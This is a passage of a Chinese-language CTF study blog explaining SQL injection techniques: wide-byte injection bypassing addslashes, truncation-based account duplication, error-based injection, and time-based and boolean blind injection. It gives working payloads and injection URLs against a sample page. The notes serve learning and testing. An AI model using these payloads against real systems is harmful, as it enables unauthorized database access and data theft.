毕设搞完了，暂时性的有了一些自由学习的时间，准备系统的学一下CTF的东西

预计花上一两个月的时间把各类知识点全都看一遍，刷一些题吧，首先还是从比较简单的Web开始


<!--more-->


## SQL注入

### 宽字节注入

首先是URL转码相关的内容，比较重要的几个字符

| 空格 | %20  |
| ---- | ---- |
| ‘    | %27  |
| #    | %23  |
| \    | %5c  |



#### addslashes

php存在一个函数`addslashes`，增加反斜线的函数，在代码审计中比较有用

```php
string addslashes(string $str)
```

这个函数返回字符串，该字符串为了数据库查询在某些字符前加上`\`

由于这个函数的存在，导致输入的字符串无法直接执行



`addslashes`的绕过有两种思路

1. 在`\`前面再加一个`\`
2. 把`\`弄没



#### 宽字节注入的原理

这是利用了mysql的一个特性，在使用gbk编码时两个字符会认为是一个汉字，前一个ascii码的值要大于128

比如`\'`本身的URL编码是`%5c%27`

如果在前面加上一个`%df`，即`%df%5c%27`

这样将`%df%5c`识别为一个汉字，就令本身的`\`失去了作用



在sqlmap中如果想要用到这个特性，可以使用上一个前缀

```bash
sqlmap --prefix='%aa%27'这样的就可以
```



### 基于约束的SQL攻击

一个登录系统中，一般情况下注册用户实际上就是在数据库中插入一项新的条目；

而登录请求则是对用户名和密码进行查询，典型的语句一般是`select * from user where username ='admin' and password='123456789'`

如果查到的结果不为空，则认为输对了用户名密码

```sql
create table user(
id int not null auto increment
username varchar(30) not null
password varchar(30) not null,
primary key(id));

insert into user values('','admin','123456789');
```

以这样的一个表为例，这个表中存在的问题在于，`username`没有设置为`unique`，但是却有`30`个字符的长度限制

这会导致在创建一个新用户时，如果输入一个长度为30以上的用户名，30位以后的内容都会被吞掉

同时在mysql中又存在一个特性，查询时后面多余的空格会被删掉

所以可以使用这样的指令在其中插入一个新的`admin`

```mysql
insert into user values('','admin                 1','1111')
```

这样最后一个1因为长度超过30被吞掉，而一堆空格在查询时又会被忽略

就导致实际上登录时如果输入`admin`和`1111`

执行的查询语句是`select * from user where username='admin' and password='1111'`，由于之前插入过一个新的admin，这个admin查询出的结果就不为空了

导致可以登录成功



### 报错注入

报错注入的原理就是注入一些会导致执行出错的语句，使得数据库在回显出错信息时输出想要的内容



例子的话，首先看一个公式，这里面`user()`这个位置可以替换成想要执行的语句

```sql
and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

这里面的几个函数，`rand`是产生一个0-1的随机数，`floor`则是向下取整，rand乘以2得到的结果再向下取整就是一个0或1，`rand(0)`是以0为随机数种子生成随机数序列，由于种子固定，因此实际上这个随机数序列是固定的

报错的原理：

`floor(rand(0)*2)`的结果序列前几位是011011

首先这样一个语句

```sql
select floor(rand(0)*2) from information_schema.tables
```

这会得到`information_schema.tables`数量个的0或1

 在上面的语句中，实际上是这样的语句出了错

```sql
select count(*),floor(rand(0)*2) from information_schema.tables group by floor(rand(0)*2)
```

这个查询的内容是从表中查`count(*),floor(rand(0)*2)`这样的东西



1. 查询前默认会建立空虚拟表
2. 取第一条记录,执行`floor(rand(0)*2)`,发现结果为0(第一次计算),查询虚拟
    表,发现0的键值不存在,则`floor(rand(0)*2)`会被再计算一次,结果为1(第
    次计算),插入虚表,这时第一条记录
3. 查询第二条记录,再次计算`floor(rand(0)*2)`,发现结果为1(第三次计算),
    查询虚表,发现1的键值存在,所以`floor(rand(0)*2)`不会被计算第二次,直接
    `count(*)`加1,第二条记录查询完毕查询完毕
4. 查询第三条记录,再次计算`floor(rand(0)*2)`,发现结果为0(第4次计
    算),查询虛表,发现键值没有0,则数据库尝试插入一条新的数据,在插入
    数据时`floor(rand(0)*2)`被再次计算,作为虚表的主键,其值为1(第5次计算)
    然而1这个主键已经存在于虚拟表中,而新计算的值也为1(主键键值必须唯
    ),所以插入的时候就直接报错了

最终group by分组依据的键值有重复项，于是会出错 



类似的报错函数含有很多，比如`updatexml`等等



### 基于时间的盲注

对于没有回显的SQL注入，可以用一些时间相关的函数进行注入，判断时间变化

最常用的一个就是sleep

```sql
select * from table where id=1 and sleep(4)
```

这样的语句执行了的话会`sleep`4秒钟

如果改一下这个逻辑

```sql
select * from table where id=1 or sleep(4)
```

这样如果一个表，其中有`id=1，2，3，4，5`

那这条语句在执行时会`sleep16秒`

这是因为只有id=1时没有sleep，其他的地方发现`id=1`这个逻辑为假，执行了后面的`or`

除了sleep还有一些别的函数

```sql
select BENCHMARK(100000,sha(1));
```

benchmark函数是执行第二个参数第一个参数次，结果值一般是0

还可以不借用函数，使用笛卡尔积实现

```sql
select count(*) from information_schema.columns A,information_schema.columns B,information_schema.tables C
```

还有GET_LOCK

```sql
GET_LOCK(str,timeout)
```

这个函数是对字符串str上锁，超时时间为timeout秒

以及在一个黑客大会上提出的一个方法

RLIKE
通过`rpad`以及`repeat`构造长字符串，加上计算大量的pattern，通过repeat的参数控制延时长度



#### SQL语法中的IF

```sql
IF(exp1,exp2,exp3)
```

如果`exp1`为真则返回`exp2`的值，为假则返回`exp3`的值



#### 截取函数

```sql
substr(str,pos,len)
substring(str,pos,len)
substring(str,pos)
substring(str from pos for len)
substring(str from pos)
substring_index(str,delim,count) # 返回第count个delim出现前的str内容
```

通过这个截取函数，结合sleep函数可以对表中的用户名进行单字母的猜测



也可以使用正则表达式结合sleep实现逐位匹配的方法

```sql
select * from user where password rlike '^12';
select * from user where password regexp '^13';
```



#### CASE WHEN语句

结合CASE语句也可以实现类似的效果

```sql
select case when username='admin' then 'admin' else sleep(3) end from users;
```



### bool型盲注

这类盲注的特点是页面只返回True或False两种情况，需要根据这个猜数据

两个相关的截取函数

```sql
left(str,length)
right(str,length)
```

转换成数字可以使用到

```sql
ascii()
ord()
```

两个函数作用都是求字符串首字母的ascii值



#### 判断注入点

bool型盲注的注入点不能通过报错判断，sql执行失败和没有查到数据都会返回false的页面

只能通过逻辑值判断

```sql
/* 整型注入 */
sql-bool.php?name=user1 and 1=1
sql-bool.php?name=user1 and 1=2
/* 字符型注入 */
sql-bool.php?name=user1' and '1'='1
sql-bool.php?name=user1' and '1'='2
/* 字符型注入 */
sql-bool.php?name=user1" and "1"="1
sql-bool.php?name=user1" and "1"="2
```

根据页面的返回情况判断注入的类型



#### 获取数据

由于盲注没有返回结果，获取数据是使用字符串截取的函数对字符串逐位比较得到的

首先要猜字段的长度

```sql
/* 判断库名长度 */
sql-bool.php?name=user1' and (select length(database())) = 1 and '1'='1
sql-bool.php?name=user1' and (select length(database())) = 2 and '1'='1
sql-bool.php?name=user1' and (select length(database())) = 3 and '1'='1
sql-bool.php?name=user1' and (select length(database())) = 4 and '1'='1
```